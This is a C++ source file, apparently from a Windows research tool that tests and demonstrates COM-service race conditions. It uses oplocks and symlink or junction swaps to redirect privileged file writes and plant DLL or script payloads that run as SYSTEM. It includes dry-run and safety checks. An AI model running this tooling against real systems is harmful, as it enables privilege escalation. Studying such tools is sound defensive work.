#include "comrace/runner.hpp"

#include "comrace/json_output.hpp"
#include "comrace/version.hpp"

#include <algorithm>
#include <cctype>
#include <charconv>
#include <cstdint>
#include <filesystem>
#include <iterator>
#include <limits>
#include <sstream>
#include <stdexcept>
#include <system_error>
#include <vector>

namespace comrace {

int swap_start_offset_for_attempt(const RunConfig& config, int attempt) {
  if (!config.adaptiveTiming || attempt <= 1) {
    return config.swapStartOffsetUs;
  }

  constexpr int kAdditionalOffsetsUs[] = {
      0, 1000, 5000, 10000, 20000, 50000, 100000, 200000, 500000};
  const int index = (std::min)(attempt - 1,
      static_cast<int>(std::size(kAdditionalOffsetsUs)) - 1);
  return config.swapStartOffsetUs + kAdditionalOffsetsUs[index];
}

namespace {

std::string lower_ascii(std::string value) {
  std::transform(value.begin(), value.end(), value.begin(), [](unsigned char c) {
    return static_cast<char>(std::tolower(c));
  });
  return value;
}

std::string replace_all(std::string value, const std::string& needle, const std::string& replacement) {
  std::size_t pos = 0;
  while ((pos = value.find(needle, pos)) != std::string::npos) {
    value.replace(pos, needle.size(), replacement);
    pos += replacement.size();
  }
  return value;
}

std::size_t last_separator(const std::string& path) {
  const std::size_t slash = path.find_last_of('/');
  const std::size_t backslash = path.find_last_of('\\');
  if (slash == std::string::npos) {
    return backslash;
  }
  if (backslash == std::string::npos) {
    return slash;
  }
  return std::max(slash, backslash);
}

std::string file_name(const std::string& path) {
  const std::size_t pos = last_separator(path);
  if (pos == std::string::npos) {
    return path;
  }
  return path.substr(pos + 1);
}

std::string parent_path(const std::string& path) {
  const std::size_t pos = last_separator(path);
  if (pos == std::string::npos) {
    return ".";
  }
  if (pos == 2 && path.size() > 2 && path[1] == ':') {
    return path.substr(0, 3);
  }
  return path.substr(0, pos);
}

std::string join_path(const std::string& left, const std::string& right) {
  if (left.empty()) {
    return right;
  }
  if (right.empty()) {
    return left;
  }
  const char tail = left.back();
  if (tail == '\\' || tail == '/') {
    return left + right;
  }
  return left + "\\" + right;
}

std::string normalize_path_for_overlap(std::string value) {
  std::replace(value.begin(), value.end(), '/', '\\');
  value = lower_ascii(value);

  if (value.rfind("\\\\?\\", 0) == 0) {
    value.erase(0, 4);
  }

  while (value.size() > 3 && value.back() == '\\') {
    value.pop_back();
  }

  std::string root;
  std::size_t start = 0;
  if (value.size() >= 2 && value[1] == ':') {
    root = value.substr(0, 2);
    start = 2;
    if (start < value.size() && value[start] == '\\') {
      root += "\\";
      ++start;
    }
  } else if (value.rfind("\\\\", 0) == 0) {
    root = "\\\\";
    start = 2;
  }

  std::vector<std::string> parts;
  while (start <= value.size()) {
    const std::size_t end = value.find('\\', start);
    const std::string part = value.substr(
        start,
        end == std::string::npos ? std::string::npos : end - start);
    if (part.empty() || part == ".") {

    } else if (part == "..") {
      if (!parts.empty() && parts.back() != "..") {
        parts.pop_back();
      } else if (root.empty()) {
        parts.push_back(part);
      }
    } else {
      parts.push_back(part);
    }

    if (end == std::string::npos) {
      break;
    }
    start = end + 1;
  }

  std::string normalized = root;
  for (const std::string& part : parts) {
    if (!normalized.empty() && normalized.back() != '\\') {
      normalized += "\\";
    }
    normalized += part;
  }
  return normalized.empty() ? value : normalized;
}

bool is_path_inside(const std::string& child, const std::string& parent) {
  const std::string normalizedChild = normalize_path_for_overlap(child);
  const std::string normalizedParent = normalize_path_for_overlap(parent);
  if (normalizedChild.empty() || normalizedParent.empty() || normalizedParent == ".") {
    return false;
  }
  if (normalizedChild.size() <= normalizedParent.size()) {
    return false;
  }
  if (normalizedChild.compare(0, normalizedParent.size(), normalizedParent) != 0) {
    return false;
  }
  return normalizedChild[normalizedParent.size()] == '\\';
}

void validate_path_separation(const ResolvedRun& run) {
  const std::string workspace = normalize_path_for_overlap(run.workspace);
  const std::string targetDirectory = normalize_path_for_overlap(run.targetDirectory);
  if (workspace.empty() || targetDirectory.empty() || targetDirectory == ".") {
    return;
  }

  if (workspace == targetDirectory) {
    throw std::runtime_error("workspace must not equal target directory; pass --allow-path-overlap to override");
  }
  if (is_path_inside(run.targetDirectory, run.workspace)) {
    throw std::runtime_error("target directory must not be inside workspace; pass --allow-path-overlap to override");
  }
  if (is_path_inside(run.workspace, run.targetDirectory)) {
    throw std::runtime_error("workspace must not be inside target directory; pass --allow-path-overlap to override");
  }
}

std::string render_value(
    std::string value,
    const ResolvedRun& run) {
  value = replace_all(value, "{workspace}", run.workspace);
  value = replace_all(value, "{target_path}", run.targetPath);
  value = replace_all(value, "{target_directory}", run.targetDirectory);
  value = replace_all(value, "{target_filename}", run.targetFileName);
  value = replace_all(value, "{safe_directory}", run.safeDirectory);
  value = replace_all(value, "{bait_path}", run.baitPath);
  value = replace_all(value, "{content}", run.content);
  value = replace_all(value, "{payload_path}", run.payloadPath);
  value = replace_all(value, "{marker_path}", run.markerPath);
  return value;
}

ArgumentSourceKind classify_argument_source(
    const MethodArgument& argument,
    bool attackerControlledPath) {
  if (attackerControlledPath) {
    return ArgumentSourceKind::BaitPath;
  }
  if (argument.value == "{content}") {
    return ArgumentSourceKind::Content;
  }
  if (argument.value == "{payload_path}") {
    return ArgumentSourceKind::PayloadPath;
  }
  if (argument.value == "{target_path}") {
    return ArgumentSourceKind::TargetPath;
  }
  if (argument.value == "{marker_path}") {
    return ArgumentSourceKind::MarkerPath;
  }
  if (argument.value.find('{') != std::string::npos ||
      argument.value.find('}') != std::string::npos) {
    return ArgumentSourceKind::Composed;
  }
  return ArgumentSourceKind::Literal;
}

template <typename T>
bool parse_integer_exact(const std::string& value, T& parsed) {
  if (value.empty()) {
    return false;
  }

  const char* begin = value.data();
  const char* end = begin + value.size();
  if (*begin == '+') {
    ++begin;
    if (begin == end) {
      return false;
    }
  }

  const auto result = std::from_chars(begin, end, parsed, 10);
  return result.ec == std::errc{} && result.ptr == end;
}

void validate_resolved_argument(const ResolvedArgument& argument) {
  switch (argument.type) {
    case ArgumentType::String:
    case ArgumentType::Path:
      return;
    case ArgumentType::Int32: {
      std::int32_t parsed = 0;
      if (!parse_integer_exact(argument.value, parsed)) {
        throw std::runtime_error(
            "method argument \"" + argument.name + "\" is not a valid int32: " + argument.value);
      }
      return;
    }
    case ArgumentType::UInt32: {
      std::uint32_t parsed = 0;
      if (!parse_integer_exact(argument.value, parsed)) {
        throw std::runtime_error(
            "method argument \"" + argument.name + "\" is not a valid uint32: " + argument.value);
      }
      return;
    }
    case ArgumentType::Int64: {
      std::int64_t parsed = 0;
      if (!parse_integer_exact(argument.value, parsed)) {
        throw std::runtime_error(
            "method argument \"" + argument.name + "\" is not a valid int64: " + argument.value);
      }
      return;
    }
    case ArgumentType::Boolean:
      if (argument.value != "true" && argument.value != "false" &&
          argument.value != "1" && argument.value != "0") {
        throw std::runtime_error(
            "method argument \"" + argument.name + "\" is not a valid bool: " + argument.value);
      }
      return;
  }
}

bool looks_dangerous_system_target(const std::string& path) {
  std::string value = lower_ascii(path);
  std::replace(value.begin(), value.end(), '/', '\\');
  return value.find("\\windows\\") != std::string::npos ||
         value.rfind("c:\\windows\\", 0) == 0 ||
         value.find("\\system32\\") != std::string::npos ||
         value.find("\\syswow64\\") != std::string::npos;
}

std::string to_string(RunMode mode) {
  switch (mode) {
    case RunMode::RedirectWrite:
      return "redirect-write";
    case RunMode::Write:
      return "write";
    case RunMode::ExecDll:
      return "exec-dll";
    case RunMode::ExecScript:
      return "exec-script";
    case RunMode::CheckReopen:
      return "check-reopen";
  }
  return "unknown";
}

bool is_payload_mode(RunMode mode) {
  return mode == RunMode::Write || mode == RunMode::ExecDll ||
         mode == RunMode::ExecScript;
}

bool is_execution_mode(RunMode mode) {
  return mode == RunMode::ExecDll || mode == RunMode::ExecScript;
}

}

bool execution_identity_matches_expected(
    const std::string& expectedIdentity,
    const std::string& identityScope,
    const std::string& processSid,
    const std::string& processAccount,
    bool impersonating,
    const std::string& threadSid) {
  std::string actualSid = processSid;
  std::string actualAccount = processAccount;
  if (identityScope == "effective" && impersonating) {
    actualSid = threadSid;
    actualAccount.clear();
  }

  const std::string expected = lower_ascii(expectedIdentity);
  if (expected == "system" || expected == "nt authority\\system" ||
      expected == "s-1-5-18") {
    return lower_ascii(actualSid) == "s-1-5-18";
  }
  if (expected.rfind("s-1-", 0) == 0) {
    return lower_ascii(actualSid) == expected;
  }
  return !actualAccount.empty() &&
         lower_ascii(actualAccount) == expected;
}

BuildGateDecision target_build_gate(
    const TargetDefinition& definition,
    const std::string& build) {
  if (definition.minOsBuild == 0 && definition.maxOsBuild == 0) {
    return BuildGateDecision::NoGate;
  }
  if (build.empty()) {
    return BuildGateDecision::Unverifiable;
  }
  std::vector<std::string> parts;
  std::size_t start = 0;
  while (true) {
    const std::size_t dot = build.find('.', start);
    if (dot == std::string::npos) {
      parts.push_back(build.substr(start));
      break;
    }
    parts.push_back(build.substr(start, dot - start));
    start = dot + 1;
  }
  if (parts.size() < 3) {
    return BuildGateDecision::Unverifiable;
  }
  std::size_t parsedBuild = 0;
  std::size_t parsedRevision = 0;
  if (!parse_integer_exact(parts[2], parsedBuild)) {
    return BuildGateDecision::Unverifiable;
  }
  if (parts.size() > 3 && !parse_integer_exact(parts[3], parsedRevision)) {
    return BuildGateDecision::Unverifiable;
  }
  if (definition.minOsBuild != 0 &&
      (parsedBuild < definition.minOsBuild ||
       (parsedBuild == definition.minOsBuild &&
        definition.minOsRevision != 0 &&
        parsedRevision < definition.minOsRevision))) {
    return BuildGateDecision::OutOfRange;
  }
  if (definition.maxOsBuild != 0 &&
      (parsedBuild > definition.maxOsBuild ||
       (parsedBuild == definition.maxOsBuild &&
        definition.maxOsRevision != 0 &&
        parsedRevision > definition.maxOsRevision))) {
    return BuildGateDecision::OutOfRange;
  }
  return BuildGateDecision::Supported;
}

std::string fnv1a_hex8(const std::string& value) {
  std::uint32_t hash = 2166136261u;
  for (const unsigned char c : value) {
    hash ^= c;
    hash *= 16777619u;
  }
  std::ostringstream out;
  out << std::hex << std::setw(8) << std::setfill('0') << hash;
  return out.str();
}

bool target_build_supported(
    const TargetDefinition& definition,
    const std::string& build) {
  const BuildGateDecision decision = target_build_gate(definition, build);
  return decision == BuildGateDecision::Supported ||
      decision == BuildGateDecision::NoGate;
}

ResolvedRun resolve_run(const RunConfig& config) {
  ResolvedRun run;
  run.workspace = config.workspace.empty()
      ? (config.target.defaultWorkspace.empty()
             ? default_workspace_platform()
             : config.target.defaultWorkspace)
      : config.workspace;
  if (config.mode == RunMode::CheckReopen) {
    if (!config.targetPath.empty()) {
      throw std::runtime_error(
          "check derives its destination inside the controlled workspace; --dest is not accepted");
    }
    std::string checkFileName = file_name(config.target.defaultTarget);
    if (checkFileName.empty() || checkFileName == "." || checkFileName == "..") {
      checkFileName = "reopen-check.txt";
    }
    run.targetPath =
        join_path(join_path(run.workspace, "reopen-check"), checkFileName);
  } else if (is_execution_mode(config.mode) && config.targetPath.empty()) {
    if (config.target.targetRequired) {
      throw std::runtime_error(
          "this target variant requires an expert destination override");
    }
    run.targetPath = config.target.execution.targetPath;
  } else {
    if (config.target.targetRequired && config.targetPath.empty()) {
      throw std::runtime_error(
          "this target variant requires --dest <approved-path>");
    }
    run.targetPath = config.targetPath.empty() ? config.target.defaultTarget : config.targetPath;
  }
#ifdef _WIN32

  if (!run.workspace.empty()) {
    run.workspace = std::filesystem::absolute(
        std::filesystem::u8path(run.workspace)).lexically_normal().u8string();
  }
  if (!run.targetPath.empty()) {
    run.targetPath = std::filesystem::absolute(
        std::filesystem::u8path(run.targetPath)).lexically_normal().u8string();
  }
#endif
  run.targetDirectory = parent_path(run.targetPath);
  run.targetFileName = file_name(run.targetPath);
  run.safeDirectory = join_path(run.workspace, "safe");
  run.baitPath = join_path(run.safeDirectory, run.targetFileName);
  if (config.target.swapPrimitive == SwapPrimitive::DosDeviceSymlink) {
    run.dosDeviceName = fnv1a_hex8(normalize_path_for_overlap(run.workspace));
  }
  run.content = config.content.empty() ? config.target.content : config.content;
  run.payloadPath = config.payloadPath.empty()
      ? (!config.target.payload.source.empty()
             ? config.target.payload.source
             : config.target.execution.payloadPath)
      : config.payloadPath;
  run.markerPath = config.target.execution.markerPath;
  if (!run.markerPath.empty()) {
    run.markerPath = render_value(run.markerPath, run);
    run.markerDirectory = parent_path(run.markerPath);
  }

  if (run.workspace.empty()) {
    throw std::runtime_error("workspace cannot be empty");
  }
  if (run.targetPath.empty()) {
    throw std::runtime_error("target path cannot be empty");
  }
  if (run.targetFileName.empty() || run.targetFileName == "." || run.targetFileName == "..") {
    throw std::runtime_error("target path must include a file name");
  }
  if (config.mode == RunMode::CheckReopen) {
    if (!is_path_inside(run.targetDirectory, run.workspace)) {
      throw std::runtime_error(
          "check destination must resolve inside the controlled workspace");
    }
    if (normalize_path_for_overlap(run.targetDirectory) ==
        normalize_path_for_overlap(run.safeDirectory)) {
      throw std::runtime_error(
          "check destination directory must differ from the bait directory");
    }
  } else if (!config.allowPathOverlap) {
    validate_path_separation(run);
  }
  if (is_payload_mode(config.mode) && run.payloadPath.empty()) {
    throw std::runtime_error("this action requires an input payload file");
  }
  if (config.mode == RunMode::ExecScript &&
      config.payloadKindOverride == "script" &&
      config.target.execution.kind != ExecutionKind::Script) {
    throw std::runtime_error(
        "the selected target variant does not implement script execution");
  }
  if (config.mode == RunMode::ExecDll &&
      config.payloadKindOverride == "dll" &&
      config.target.execution.kind == ExecutionKind::Script) {
    throw std::runtime_error(
        "the selected target variant does not implement DLL execution");
  }
  if (is_execution_mode(config.mode) && config.target.execution.markerRequired) {
    if (run.markerPath.empty()) {
      throw std::runtime_error("required execution marker resolved to an empty path");
    }
    if (normalize_path_for_overlap(run.markerPath) ==
        normalize_path_for_overlap(run.targetPath)) {
      throw std::runtime_error(
          "execution marker path must not resolve to the planted payload path");
    }
  }

  run.arguments.reserve(config.target.methodArgs.size());
  for (std::size_t i = 0; i < config.target.methodArgs.size(); ++i) {
    const MethodArgument& source = config.target.methodArgs[i];
    ResolvedArgument arg;
    arg.name = source.name;
    arg.type = source.type;
    const bool attackerControlled =
        i == config.target.attackerControlledPathArg;
    arg.sourceKind = classify_argument_source(source, attackerControlled);
    arg.value = attackerControlled
        ? (run.dosDeviceName.empty()
               ? run.baitPath
               : "\\\\.\\" + run.dosDeviceName + "\\" + run.targetFileName)
        : render_value(source.value, run);
    validate_resolved_argument(arg);
    run.arguments.push_back(std::move(arg));
  }

  return run;
}

std::string describe_plan(const RunConfig& config) {
  const ResolvedRun run = resolve_run(config);

  std::ostringstream out;
  out << "Target action: " << config.target.name << "\n";
  if (!config.target.description.empty()) {
    out << "Description: " << config.target.description << "\n";
  }
  out << "Invoker: " << config.target.invoker << "\n";
  out << "Operation side effects: " << config.target.sideEffectLevel << "\n";
  out << "Retry policy: "
      << (config.target.retrySafe ? "retry-safe" : "not declared retry-safe")
      << "; recommended maximum "
      << config.target.maxRecommendedAttempts << " attempt(s)\n";
  out << "Invocation host architecture request: " << config.hostArch << "\n";
  if (config.target.minOsBuild != 0 || config.target.maxOsBuild != 0) {
    out << "OS build gate:";
    if (config.target.minOsBuild != 0) {
      out << " >= " << config.target.minOsBuild;
      if (config.target.minOsRevision != 0) {
        out << '.' << config.target.minOsRevision;
      }
    }
    if (config.target.minOsBuild != 0 && config.target.maxOsBuild != 0) {
      out << " and";
    }
    if (config.target.maxOsBuild != 0) {
      out << " <= " << config.target.maxOsBuild;
      if (config.target.maxOsRevision != 0) {
        out << '.' << config.target.maxOsRevision;
      }
    }
    out << "\n";
  }
  if ((config.hostArch.empty() || config.hostArch == "auto") &&
      config.target.invoker != "native_adapter") {
    out << "Target architecture: unresolved (auto uses the native x64 host for "
           "IDispatch; use --host-arch when target bitness is known)\n";
  } else if (config.target.invoker == "native_adapter" &&
             (config.hostArch.empty() || config.hostArch == "auto")) {
    out << "Target architecture selection: inferred from the adapter PE image\n";
  } else {
    out << "Target architecture selection: operator-forced host bitness\n";
  }
  if (config.target.invoker == "native_adapter") {
    out << "Adapter: " << config.target.nativeAdapter.path << "\n";
    out << "Adapter entrypoint: "
        << config.target.nativeAdapter.entrypoint << "\n";
  }
  if (!config.target.clsid.empty()) {
    out << "CLSID: " << config.target.clsid << "\n";
  }
  if (!config.target.iid.empty()) {
    out << "IID: " << config.target.iid << "\n";
  }
  out << "Method: " << config.target.method << "\n";
  out << "Mode: " << to_string(config.mode) << "\n";
  out << "Pattern: " << config.target.vulnerabilityPattern
      << " (service touches path, then later reopens it for write)\n";
  out << "Primitive: " << to_string(config.target.privilegedOperation)
      << " via " << to_string(config.target.raceTrigger)
      << " + " << to_string(config.target.swapPrimitive) << "\n";
  out << "Trigger: " << to_string(config.target.raceTrigger)
      << (config.target.baitPrecreated ? " (bait file pre-created)"
                                        : " (bait not pre-created; server makes it)")
      << "\n";
  if (config.target.baitKind == BaitKind::CloudPlaceholder) {
    out << "Bait kind: cloud placeholder (ephemeral sync root, registered per attempt)\n";
  }
  if (config.target.raceTrigger == RaceTrigger::WnfState) {
    out << "WNF state: " << config.target.triggerWnfState
        << " (polled until its data changes)\n";
  }
  out << "Workspace: " << run.workspace << "\n";
  out << "Target: " << run.targetPath << "\n";
  if (config.mode == RunMode::CheckReopen) {
    out << "Check scope: attacker-controlled workspace only; successful "
           "redirection proves a later name resolution, not a privilege boundary\n";
  }
  if (is_payload_mode(config.mode)) {
    out << "Payload: " << run.payloadPath << "\n";
  }
  if (is_execution_mode(config.mode)) {
    if (!config.target.execution.trigger.empty()) {
      out << "Execution trigger: " << config.target.execution.trigger << "\n";
    }
    if (!config.target.execution.expectedIdentity.empty()) {
      out << "Expected execution identity: " << config.target.execution.expectedIdentity << "\n";
    }
    if (!run.markerPath.empty()) {
      out << "Execution marker: " << run.markerPath << "\n";
    }
    if (config.target.execution.markerRequired) {
      out << "Marker verification: required within "
          << config.target.execution.markerTimeoutMs << " ms"
          << "; contains: " << config.target.execution.markerContains << "\n";
    }
  }
  out << "Bait path passed to COM: " << run.baitPath << "\n";
  if (config.target.swapPrimitive == SwapPrimitive::ObjectManagerSymlink) {
    out << "Swap: \\RPC Control\\" << run.targetFileName
        << " object symlink repoint -> " << run.targetPath
        << " (initially a decoy in the workspace)\n";
  } else if (config.target.swapPrimitive == SwapPrimitive::DosDeviceSymlink) {
    out << "Swap: \\\\.\\ dos device '" << run.dosDeviceName
        << "' repoint -> " << run.targetDirectory
        << " (same-logon-session targets only)\n";
  } else {
    out << "Junction swap: " << run.safeDirectory << " -> "
        << run.targetDirectory << "\n";
  }
  out << "Attempts: " << config.attempts << "\n";
  out << "Timing: release-before-swap";
  if (config.adaptiveTiming) {
    out << ", adaptive swap-start offsets";
    const int count = (std::min)(config.attempts, 9);
    for (int attempt = 1; attempt <= count; ++attempt) {
      out << (attempt == 1 ? " " : ", ")
          << swap_start_offset_for_attempt(config, attempt) << " us";
    }
    out << "\n";
  } else {
    out << ", swap-start offset " << config.swapStartOffsetUs << " us\n";
  }
  out << "Oplock timeout / swap-loop budget: " << config.oplockTimeoutMs << " ms\n";
  if (config.mode == RunMode::CheckReopen) {
    out << "Destination precheck: require derived target directory to be writable\n";
  } else {
    out << "Destination precheck: "
        << (config.allowWritableTarget ? "writable target allowed" : "require target dir not writable")
        << "\n";
  }
  if (config.mode == RunMode::CheckReopen) {
    out << "Path layout: bait and check directories are controlled workspace siblings\n";
  } else {
    out << "Path overlap: " << (config.allowPathOverlap ? "allowed" : "blocked") << "\n";
  }
  out << "Diagnostics: " << (config.verbose ? "verbose" : "standard") << "\n";
  out << "Execution: " << (config.execute ? "execute" : "dry-run") << "\n";
  out << "Method arguments:\n";
  for (std::size_t i = 0; i < run.arguments.size(); ++i) {
    out << "  [" << i << "] " << run.arguments[i].name
        << " (" << to_string(run.arguments[i].type) << ") = "
        << run.arguments[i].value;
    if (i == config.target.attackerControlledPathArg) {
      out << "  [attacker-controlled path]";
    }
    out << "\n";
  }
  return out.str();
}

std::string describe_probe(const RunConfig& config) {
  std::ostringstream out;
  out << "Probe: "
      << (config.target.invoker == "native_adapter"
              ? "target-specific native adapter validation"
              : "COM activation and IDispatch method resolution")
      << " only\n";
  out << "Target action: " << config.target.name << "\n";
  out << "Invoker: " << config.target.invoker << "\n";
  if (config.target.invoker == "native_adapter") {
    out << "Adapter: " << config.target.nativeAdapter.path << "\n";
    out << "Adapter entrypoint: "
        << config.target.nativeAdapter.entrypoint << "\n";
  }
  if (!config.target.clsid.empty()) {
    out << "CLSID: " << config.target.clsid << "\n";
  }
  if (!config.target.iid.empty()) {
    out << "IID: " << config.target.iid << "\n";
  }
  out << "Method: " << config.target.method << "\n";
  out << "No race setup and no vulnerable method invocation will be performed.\n";
  return out.str();
}

std::string describe_observation(const RunConfig& config) {
  const ResolvedRun run = resolve_run(config);
  std::ostringstream out;
  out << "Observation invocation only; no oplock, junction, or target swap\n";
  out << "Target action: " << config.target.name << "\n";
  out << "Invoker: " << config.target.invoker << "\n";
  if (!config.target.clsid.empty()) {
    out << "CLSID: " << config.target.clsid << "\n";
  }
  out << "Method: " << config.target.method << "\n";
  out << "Controlled workspace: " << run.workspace << "\n";
  out << "Bait path: " << run.baitPath << "\n";
  out << "Initial bait state: "
      << (config.prepareObservationBait
              ? "pre-created with controlled content"
              : "missing file in an existing directory")
      << "\n";
  out << "Execution: " << (config.execute ? "invoke once" : "dry-run") << "\n";
  out << "Capture file activity externally, export it as Process Monitor CSV, "
         "then run the analyze command.\n";
  out << "Method arguments:\n";
  for (std::size_t i = 0; i < run.arguments.size(); ++i) {
    out << "  [" << i << "] " << run.arguments[i].name
        << " (" << to_string(run.arguments[i].type) << ") = "
        << run.arguments[i].value << "\n";
  }
  return out.str();
}

RunResult run_target_action(const RunConfig& config) {
  if (config.attempts <= 0) {
    throw std::runtime_error("attempts must be positive");
  }
  if (config.swapStartOffsetUs < 0) {
    throw std::runtime_error("swap-start offset cannot be negative");
  }
  if (config.oplockTimeoutMs <= 0) {
    throw std::runtime_error("oplock timeout must be positive");
  }

  validate_target_definition(config.target);

  const std::string hostBuild = os_build_platform();
  const BuildGateDecision gateDecision =
      target_build_gate(config.target, hostBuild);
  if (gateDecision == BuildGateDecision::OutOfRange ||
      gateDecision == BuildGateDecision::Unverifiable) {
    std::ostringstream message;
    if (gateDecision == BuildGateDecision::Unverifiable) {
      message << "host OS build could not be determined or parsed ('"
              << (hostBuild.empty() ? "unknown" : hostBuild)
              << "'); refusing a build-gated definition (";
    } else {
      message << "host OS build " << hostBuild
              << " is outside the target definition's supported build range (";
    }
    bool firstBound = true;
    if (config.target.minOsBuild != 0) {
      message << "min " << config.target.minOsBuild;
      if (config.target.minOsRevision != 0) {
        message << '.' << config.target.minOsRevision;
      }
      firstBound = false;
    }
    if (config.target.maxOsBuild != 0) {
      if (!firstBound) message << ", ";
      message << "max " << config.target.maxOsBuild;
      if (config.target.maxOsRevision != 0) {
        message << '.' << config.target.maxOsRevision;
      }
      firstBound = false;
    }
    message << ")";
    return RunResult{false, 0, message.str()};
  }

  const std::size_t requestedAttempts =
      static_cast<std::size_t>(config.attempts);
  if (config.execute && requestedAttempts > 1 &&
      (!config.target.retrySafe ||
       requestedAttempts > config.target.maxRecommendedAttempts) &&
      !config.allowUnsafeRetries) {
    std::ostringstream message;
    message << "requested " << config.attempts
            << " attempts, but the target action policy recommends at most "
            << config.target.maxRecommendedAttempts
            << "; pass --allow-unsafe-retries only after reviewing side effects";
    throw std::runtime_error(message.str());
  }

  if (config.probeCom) {
    return probe_platform(config);
  }

  const ResolvedRun run = resolve_run(config);

  if (config.mode == RunMode::ExecDll &&
      config.target.execution.kind != ExecutionKind::DllLoad) {
    throw std::runtime_error(
        "the selected target variant does not implement DLL execution");
  }
  if (config.mode == RunMode::ExecScript &&
      config.target.execution.kind != ExecutionKind::Script) {
    throw std::runtime_error(
        "the selected target variant does not implement script execution");
  }

  if (config.execute && !config.allowUnsafeTarget && looks_dangerous_system_target(run.targetPath)) {
    throw std::runtime_error(
        "target path is under a Windows system directory; use an isolated test destination or pass --allow-unsafe-target");
  }

  if (!config.execute) {
    return RunResult{true, 0, "dry-run complete; no target was modified"};
  }

  return run_platform(config);
}

RunResult observe_target_action(const RunConfig& config) {
  validate_target_definition(config.target);
  (void)resolve_run(config);
  if (!config.execute) {
    return RunResult{
        true,
        0,
        "observation dry-run complete; no COM method was invoked"};
  }
  return observe_platform(config);
}

namespace {

void write_predicate(std::ostream& out, const char* key, const char* status) {
  out << "    \"" << key << "\":\"" << status << "\"";
}

void write_ms(std::ostream& out, const char* key, double ms, bool trailingComma) {
  out << "    \"" << key << "\":";
  if (ms < 0) {
    out << "null";
  } else {
    out << ms;
  }
  if (trailingComma) {
    out << ",";
  }
  out << "\n";
}

const char* access_test_token(AccessTest t) {
  switch (t) {
    case AccessTest::Allowed:      return "allowed";
    case AccessTest::Denied:       return "denied";
    case AccessTest::Inconclusive: return "inconclusive";
    case AccessTest::NotTested:    return "not_tested";
  }
  return "not_tested";
}

const char* server_completion_token(ServerCompletion completion) {
  switch (completion) {
    case ServerCompletion::NotStarted:          return "not_started";
    case ServerCompletion::Returned:            return "returned";
    case ServerCompletion::UnknownClientKilled: return "unknown_client_killed";
    case ServerCompletion::UnknownClientExited: return "unknown_client_exited";
  }
  return "unknown";
}

const char* execution_state_token(ExecutionState state) {
  switch (state) {
    case ExecutionState::NotApplicable: return "not_applicable";
    case ExecutionState::PayloadPlaced: return "payload_placed_only";
    case ExecutionState::TriggeredUnconfirmed: return "triggered_unconfirmed";
    case ExecutionState::ObservedIdentityMismatch:
      return "execution_observed_identity_mismatch";
    case ExecutionState::Confirmed: return "execution_confirmed";
  }
  return "unknown";
}

}

std::string run_result_json(
    const RunConfig& config,
    const RunResult& result) {
  const ResolvedRun run = resolve_run(config);
  const bool activeSuccess = config.execute && result.success;
  const bool isReopen = config.mode == RunMode::CheckReopen;
  const bool isExecution = is_execution_mode(config.mode);
  const bool hasPayload = is_payload_mode(config.mode);
  const bool completeRaceEvidence =
      config.execute && result.triggerObserved &&
      result.namespaceRedirectInstalled &&
      result.targetContentMatchedAfterRedirect;
  const bool boundaryEffectObserved =
      completeRaceEvidence && !isReopen &&
      result.callerCreateAccess == AccessTest::Denied;

  std::ostringstream out;
  out << "{\n  \"schema\":\"comwriterace.run-result.v2\",\n"
      << "  \"tool_version\":\"" << COMWRITERACE_VERSION << "\",\n"
      << "  \"target_definition\":";
  json_output::write_string(out, config.target.name);
  out << ",\n  \"mode\":";
  json_output::write_string(out, to_string(config.mode));
  out << ",\n  \"invocation_host_arch_request\":";
  json_output::write_string(out, config.hostArch.empty() ? "auto" : config.hostArch);
  out << ",\n  \"target_architecture_resolution\":";
  if ((config.hostArch.empty() || config.hostArch == "auto") &&
      config.target.invoker != "native_adapter") {
    json_output::write_string(out, "unresolved_for_auto_idispatch");
  } else if (config.target.invoker == "native_adapter" &&
             (config.hostArch.empty() || config.hostArch == "auto")) {
    json_output::write_string(out, "inferred_from_adapter_image");
  } else {
    json_output::write_string(out, "operator_forced_host_bitness");
  }
  out << ",\n  \"executed\":" << (config.execute ? "true" : "false")
      << ",\n  \"success\":" << (result.success ? "true" : "false")
      << ",\n  \"attempts\":" << result.attempts
      << ",\n  \"workspace\":";
  json_output::write_string(out, run.workspace);
  out << ",\n  \"bait_path\":";
  json_output::write_string(out, run.baitPath);
  out << ",\n  \"target_path\":";
  json_output::write_string(out, run.targetPath);
  out << ",\n  \"experiment_nonce\":";
  json_output::write_string(
      out, result.experimentNonce.empty() ? "unavailable" : result.experimentNonce);

  const char* evidenceLevel =
      !config.execute ? "plan_only"
      : isReopen      ? "active_controlled_re_resolution"
      : isExecution   ? "active_execution"
      : hasPayload    ? "active_file_write"
                      : "active_protected_target";
  out << ",\n  \"evidence_level\":\"" << evidenceLevel << "\"";

  const char* inputControl = completeRaceEvidence ? "proven" : "not_tested";
  const char* initialTouch = result.triggerObserved ? "observed" : "not_observed";
  const char* laterResolution =
      completeRaceEvidence
          ? (hasPayload && !config.target.execution.developmentNonceOverlay
                 ? "observed_sha256_bound_redirect"
                 : "observed_nonce_bound_redirect")
                           : (config.execute ? "not_observed" : "not_tested");
  const char* callerCreateAccess = access_test_token(result.callerCreateAccess);
  const char* boundaryWrite =
      boundaryEffectObserved         ? "observed_effect_beyond_caller_access"
      : (completeRaceEvidence && result.callerCreateAccess == AccessTest::Allowed)
                                     ? "not_a_boundary_for_this_caller"
      : config.execute               ? "not_observed"
                                     : "not_tested";

  out << ",\n  \"predicates\":{\n";
  write_predicate(out, "input_control", inputControl);            out << ",\n";
  write_predicate(out, "initial_touch", initialTouch);            out << ",\n";
  write_predicate(out, "later_name_resolution", laterResolution); out << ",\n";
  write_predicate(out, "caller_create_access", callerCreateAccess); out << ",\n";
  write_predicate(out, "boundary_write", boundaryWrite);          out << "\n  }";

  out << ",\n  \"boundary_write\":{"

      << "\"proven\":" << (boundaryEffectObserved ? "true" : "false")
      << ",\"observed\":" << (boundaryEffectObserved ? "true" : "false")
      << ",\"relative_to_sid\":";
  json_output::write_string(out, result.callerSid.empty() ? "unknown" : result.callerSid);
  out << ",\"direct_write_test\":\"" << callerCreateAccess
      << "\",\"causal_writer_attribution\":\"unavailable_without_writer_telemetry\"}";

  out << ",\n  \"writer_identity\":{";
  if (activeSuccess && !config.target.execution.expectedIdentity.empty()) {
    out << "\"status\":\"unknown\",\"expected\":";
    json_output::write_string(out, config.target.execution.expectedIdentity);
  } else if (activeSuccess) {
    out << "\"status\":\"unknown\",\"note\":\"the nonce-bound file effect does not "
           "identify or causally attribute its writer\"";
  } else {
    out << "\"status\":\"unknown\"";
  }
  out << "}";

  out << ",\n  \"code_execution\":{";
  const bool markerLocationTrusted =
      result.markerCreateAccess == AccessTest::Denied;
  const bool codeExecutionProven =
